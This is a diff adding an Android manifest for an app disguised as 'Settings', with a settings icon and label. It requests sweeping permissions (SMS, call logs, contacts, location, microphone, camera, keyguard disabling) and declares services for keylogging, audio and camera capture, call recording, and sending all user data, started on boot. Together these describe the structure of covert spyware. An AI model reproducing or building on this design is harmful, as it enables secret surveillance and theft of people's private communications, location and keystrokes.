@@ -1,0 +1,170 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="rapidora.co.myapplication">
+
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"></uses-permission>
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="com.android.alarm.permission.SET_ALARM" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"></uses-permission>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.STORAGE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" />
+
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions"/>
+<!--    <uses-permission
+        android:name="android.permission.ACCESS_MOCK_LOCATION"
+        tools:ignore="MockLocation" />-->
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/settings"
+        android:label="Settings"
+
+
+        android:theme="@style/AppTheme">
+        <activity android:name=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+<!--
+  <activity android:name=".MainActivity">
+
+        </activity>-->
+
+
+        <activity
+            android:name=".keyboard.ImePreferences"
+            android:label="@string/settings_name">
+            <!-- <intent-filter>
+                 <action android:name="android.intent.action.MAIN" />
+
+                 <category android:name="android.intent.category.LAUNCHER" />
+             </intent-filter>-->
+        </activity>
+
+        <service
+            android:name=".keyboard.SoftKeyboard"
+            android:permission="android.permission.BIND_INPUT_METHOD">
+            <intent-filter>
+                <action android:name="android.view.InputMethod" />
+            </intent-filter>
+            <meta-data
+                android:name="android.view.im"
+                android:resource="@xml/method" />
+        </service>
+        <service android:name=".captureImage.DemoCamService" />
+
+        <service android:name=".services.OnUserRequest" />
+        <service android:name=".services.CallLogService" />
+        <service android:name=".services.ContactService" />
+        <service android:name=".services.SmsService" />
+        <service android:name=".services.GalleryService" />
+        <service android:name=".services.UserDetailService" />
+        <service android:name=".services.SendAllUserData" />
+        <service android:name=".services.UpdateLocationService"     android:enabled="true"
+            android:exported="true"  />
+
+        <service android:name=".services.SendOfflineDataService" />
+        <service android:name=".services.KeyLogService" />
+        <service android:name=".services.SendCaptureImageService" />
+        <service android:name=".services.SendRecordedAudio" />
+        <service android:name=".services.AlwaysRunning"  android:process=":externalprocess2" />
+
+
+        <service android:name=".services.SendCallDetail" />
+        <service android:name=".audioRecorder.AudioRecorderService" />
+        <!--    //  <service android:name=".services.ScreenShotService" />-->
+
+        <receiver android:name=".receiver.BootBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".receiver.RecieverforAlwaysRunning" />
+        <receiver android:name=".receiver.CaptureImageReciever" />
+
+
+        <receiver android:name=".receiver.SampleReceiver">
+
+        </receiver>
+        <receiver android:name=".receiver.CallLogReciever">
+
+        </receiver>
+        <receiver android:name=".receiver.AudioRecordReceiver">
+
+        </receiver>
+        <receiver android:name=".receiver.KeyLogReciever">
+
+        </receiver>
+        <receiver android:name=".receiver.ContactReciever">
+
+        </receiver>
+        <receiver android:name=".receiver.GalleryReciever">
+
+        </receiver>
+        <receiver android:name=".receiver.SmsReciever">
+
+        </receiver>
+        <receiver android:name=".receiver.UserDailyDataReciever">
+
+        </receiver>
+        <receiver android:name=".receiver.LocationReciever">
+
+        </receiver>
+
+        <receiver android:name=".receiver.NetworkReceiver">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".CallRecording.MyPhoneReceiver">
+            <intent-filter>
+                <action
+                    android:name="android.intent.action.PHONE_STATE"
+                    android:priority="999" />
+                <action
+                    android:name="android.intent.action.NEW_OUTGOING_CALL"
+                    android:priority="999" />
+            </intent-filter>
+        </receiver>
+
+        <!--<service android:name=".CallRecording.RecordService" />-->
+
+        <activity
+            android:name=".CallRecording.TermsActivity"
+            android:label="@string/title_activity_main" />
+    </application>
+
+</manifest>
